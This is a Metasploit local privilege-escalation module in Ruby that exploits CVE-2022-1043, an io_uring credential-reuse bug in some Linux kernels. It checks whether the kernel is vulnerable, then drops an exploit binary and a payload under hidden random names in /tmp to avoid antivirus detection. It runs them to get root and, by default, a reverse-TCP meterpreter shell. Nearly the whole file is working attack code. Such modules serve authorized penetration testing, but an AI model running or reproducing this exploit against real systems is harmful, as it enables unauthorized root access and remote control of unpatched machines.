##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = GreatRanking # https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper
  include Msf::Post::Linux::Compile
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'io_uring Same Type Object Reuse Priv Esc',
        'Description' => %q{
          This module exploits a bug in io_uring leading to an additional put_cred()
          that can be exploited to hijack credentials of other processes.

          We spawn SUID programs to get the free'd cred object reallocated by a
          privileged process and abuse them to create a SUID root binary ourselves
          that'll pop a shell.

          The dangling cred pointer will, however, lead to a kernel panic as soon as
          the task terminates and its credentials are destroyed. We therefore detach
          from the controlling terminal, block all signals and rest in silence until
          the system shuts down and we get killed hard, just to cry in vain, seeing
          the kernel collapse.

          The bug affected kernels from v5.12-rc3 to v5.14-rc7.

          More than 1 CPU is required for exploitation.

          Successfully tested against Ubuntu 22.04.01 with kernel 5.13.12-051312-generic
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'Ryota Shiga', # discovery
          'Mathias Krause' # original PoC, analysis
        ],
        'Platform' => [ 'linux' ],
        'Arch' => [ ARCH_X86, ARCH_X64 ],
        'SessionTypes' => [ 'shell', 'meterpreter' ],
        'Targets' => [[ 'Auto', {} ]],
        'Privileged' => true,
        'References' => [
          [ 'URL', 'https://grsecurity.net/exploiting_and_defending_against_same_type_object_reuse' ],
          [ 'URL', 'https://github.com/opensrcsec/same_type_object_reuse_exploits' ],
          [ 'URL', 'https://github.com/torvalds/linux/commit/a30f895ad3239f45012e860d4f94c1a388b36d14' ],
          [ 'CVE', '2022-1043' ]
        ],
        'DisclosureDate' => '2022-03-22',
        'DefaultOptions' => {
          'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
          'PrependFork' => true
        },
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [ARTIFACTS_ON_DISK]
        }
      )
    )
    register_advanced_options [
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
    ]
  end

  # Simplify pulling the writable directory variable
  def base_dir
    datastore['WritableDir'].to_s
  end

  def check
    # Check the kernel version to see if its in a vulnerable range
    release = kernel_release
    if Rex::Version.new(release.split('-').first) > Rex::Version.new('5.14-rc7') ||
       Rex::Version.new(release.split('-').first) < Rex::Version.new('5.12-rc3')
      vprint_error "Kernel version #{release} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "Kernel version #{release} appears to be vulnerable"

    # make sure we have enough CPUs. Minimum 2 required
    cpu = get_cpu_info
    if cpu[:cores] < 2
      CheckCode::Safe("> 1 CPU required, detected: #{cpu[:cores]}")
    end
    CheckCode::Vulnerable("> 1 CPU required, detected: #{cpu[:cores]}")
  end

  def exploit
    if !datastore['ForceExploit'] && is_root?
      fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override'
    end

    # Make sure we can write our exploit and payload to the local system
    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    # Upload exploit executable, writing to a random name so AV doesn't have too easy a job
    executable_name = ".#{rand_text_alphanumeric(5..10)}"
    executable_path = "#{base_dir}/#{executable_name}"
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
    if live_compile?
      vprint_status 'Live compiling exploit on system...'
      code = strip_comments(exploit_source('CVE-2022-1043', 'cve-2022-1043.c'))
      upload_and_compile executable_path, code
    else
      vprint_status 'Dropping pre-compiled exploit on system...'
      upload_and_chmodx executable_path, exploit_data('CVE-2022-1043', 'pre_compiled')
    end

    # Upload payload executable
    upload_and_chmodx payload_path, generate_payload_exe
    register_files_for_cleanup(payload_path)
    register_files_for_cleanup(executable_path)

    timeout = 30
    print_status 'Launching exploit...'
    output = cmd_exec "echo '#{payload_path} & exit' | #{executable_path}", nil, timeout
    output.each_line { |line| vprint_status line.chomp }
  end
end
